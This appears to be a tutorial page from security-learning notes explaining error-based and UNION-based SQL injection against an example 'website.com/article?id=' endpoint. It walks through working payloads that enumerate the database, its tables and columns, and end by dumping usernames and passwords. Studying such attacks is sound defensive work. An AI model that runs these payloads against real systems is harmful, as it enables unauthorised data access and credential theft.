---
sidebar_position: 2
---

# Error-Based SQLi

To Discover an Error-Based SQL Injection we need to break the code's SQL Query by trying certain characters until an Error Message is produced.


:::info Commonly Used Characters

```
[ ' ]

[ " ]
```

::: 


**If** Typing `[ ' ]` after the `id=1` returns an SQL Error in the Syntax. The fact that we received this **Error Message** confirms the existence of an **SQL Injection Vulnerability.** 

<br/>
<br/>

- **We need to return data to the browser without displaying an Error Message:**
    - This Should Produce an **Error Message** informing that the `UNION SELECT` statement has a different Number of Columns than the original `SELECT` Query 


```sql
website.com/article?id=1 UNION SELECT 1;
```

<br/>
<br/>


- **Finding the correct Number of Columns:**
	- The Error Message is now gone, and the article is being displayed, but now we want to display our Data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code. To get around that, we need the first query to produce no results. This can simply be done by changing the article ID.
	- **Changes Made to the Syntax:** `id=1 ➜ id=0` - `SELECT 1; ➜ SELECT 1,X,X;`

```sql
website.com/article?id=0 UNION SELECT 1,2,3;
```

<br/>
<br/>


- **We can start using the Returned Values to retrieve more useful Information:**
    - **Function:** `database()` Returns the name of the current **(Default)** Database
    - **Found Database Name:** `sqli_one`

```sql
0 UNION SELECT 1,2,database() ➜ "sqli_one"
```

<br/>
<br/>

- **Gather a list of Tables that are in this Database:**
    - **Function:** `group_concat()` Gets the specified Column **table_name** from multiple returned Rows and puts it into one String separated by commas.
    - **Function:** `information_schema()` Contains information about all the Databases and Tables the User has access to. (In this query we are Listing all the tables in the **sqli_one Database**, which is **"article, staff_users"**)


```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' ➜ "article,staff_users"
```

<br/>
<br/>

- Checking the **staff_users** we find Three **Columns:**
	- **id - username - password**

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users' ➜ "id,username,password"
```

<br/>
<br/>

- **We can use the Username - Password Columns in our Query to Retrieve the User's Information.**
	
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users ➜ admin:p4ssword
```